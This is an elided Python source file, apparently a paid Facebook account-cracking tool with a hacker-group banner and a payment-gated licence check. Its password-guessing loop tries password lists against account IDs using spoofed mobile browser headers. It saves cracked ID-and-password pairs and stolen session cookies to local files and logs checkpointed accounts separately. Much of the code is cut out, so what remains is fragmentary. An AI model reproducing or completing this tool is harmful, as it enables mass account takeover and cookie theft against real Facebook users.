...
try:
	...
	#os.system('git clone https://github.com/SAIKO-KING)
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ PRO ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  PRO_H4CKER            
               \033[1;91mFACEBOK      :  MD Jihad Rana             
               \033[1;97mGITHUB       :  SAIKO-KING      
               \033[1;91mSTATUS       :   PAID😈           
               \033[1;97mTEAM         :  PRO HACKERS                 
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Mr-Alon/File-Cloning-Paid/blob/main/V7.txt').text
    if id in httpCaht:
      ...
      print('BKASH PERSONAL - +8801617120503')
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://youtube.com/@jokargamingyt100?si=a_4jPxgIGl7qUup3')
		crack_file()
...
def menu1():
	...
	ot = input('\n   \x1b[1;32m Choose option >>> ')
	if ot == '1':
		os.system('xdg-open https://facebook.com/groups/713699170235592/')
		crack_file()
	if ot == '2':
		os.system('xdg-open https://facebook.com/groups/713699170235592/')
		rndm()
...
def random_headers():
    ...
    'dpr': '2',
    'referer': 'https://m.facebook.com/?_se_imp=0lODh6OpJAbvxLpUw',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5749.202", "Google Chrome";v="116.0.5749.202"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; J5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5749.202 Mobile Safari/537.36',
    'viewport-width': '980',
}
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[JIHAD_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mJIHAD KING-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m😈\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('JIHAD-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('JIHAD-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(JIHAD-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('JIHAD-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
        ...
        #sys.stdout.write('\r%s   [SAIKO] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
